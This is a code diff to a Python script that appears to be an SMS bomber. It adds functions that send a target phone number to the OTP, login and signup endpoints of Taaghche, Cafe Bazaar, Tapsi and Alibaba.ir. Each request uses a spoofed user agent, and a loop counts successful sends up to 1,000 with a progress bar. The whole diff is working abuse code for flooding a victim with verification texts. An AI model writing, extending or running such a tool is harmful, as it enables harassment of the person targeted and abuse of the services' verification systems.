@@ -3,6 +3,7 @@ from time import sleep
 import random
 import string
 from fake_useragent import UserAgent
+from json import loads
 
 
 def basalam(head):
@@ -723,6 +724,115 @@ def digiCall(head):
         print(f"[digiCall] - {e}")
 
 
+def taaghche(head):
+    try:
+        payload = {
+            "contact": f"0{number}",
+            "forceOtp": False
+        }
+        def login():
+            url = "https://gw.taaghche.com/v4/site/auth/login"
+            return requests.post(url, json=payload, headers=head)
+
+
+        def register():
+            url = "https://gw.taaghche.com/v4/site/auth/signup"
+            return requests.post(url, json=payload, headers=head)
+
+        result = login()
+        # print(f'taaghche: {result.status_code}')
+
+        if result.status_code != 200:
+            sleep(60)
+            return False
+
+        res = loads(result.content.decode())
+
+        if "loginWithPassword" in res.keys():
+            if res['loginWithPassword'] is True:
+                return False
+
+        result = register()
+
+        if result.status_code != 200:
+            sleep(60)
+            return False
+
+        return True
+
+    except Exception as e:
+        print(f"[taagche] - {e}")
+
+
+def bazar(head):
+    try:
+        url = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
+        payload = {
+                "properties":
+                    {"language": 2,
+                     "clientID": "zlximlwk7blsdneoq5de8w4ae21l5yu7",
+                     "deviceID": "zlximlwk7blsdneoq5de8w4ae21l5yu7",
+                     "clientVersion": "web"
+                     },
+                   "singleRequest":
+                       {"getOtpTokenRequest":
+                            {"username": f"98{number}"}
+                        }
+                   }
+
+        result = requests.post(url, headers=head, json=payload)
+
+        if result.status_code != 200:
+            return False
+
+        return True
+
+    except Exception as e:
+        print(f"[bazar] - {e}")
+
+
+def tapsi(head):
+    try:
+        url = "https://api.tapsi.cab/api/v2.2/user"
+        payload = {
+            "credential": {
+                "phoneNumber": f"0{number}",
+                "role": "PASSENGER"
+            },
+            "otpOption":"SMS"
+        }
+
+        result = requests.post(url, json=payload, headers=head)
+
+        # print(result.status_code, result.content.decode())
+
+        if result.status_code != 200:
+            return False
+
+        return True
+
+    except Exception as e:
+        print(f"[tapsi] - {e}")
+
+
+def alibaba(head):
+    try:
+        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+        payload = {"phoneNumber" : f"9{number}" }
+
+        result = requests.post(url, json=payload, headers=head)
+
+        print(result.status_code, result.content.decode())
+
+        if result.status_code != 200:
+            return False
+
+        return True
+
+    except Exception as e:
+        print(f"[alibaba] - {e}")
+
+
 def progressBar(finish: int, total: int):
     progress = finish / total
     percent_done = round(progress * 100, 2)
@@ -998,6 +1108,13 @@ def sendMessage(userAgent, maxCount: int = 1000):
 
 
         if digiCall(head) is True:
+            counter += 1
+            progressBar(counter, maxCount)
+            if counter == maxCount:
+                exit(0)
+
+
+        if taaghche(head) is True:
             counter += 1
             progressBar(counter, maxCount)
             if counter == maxCount:
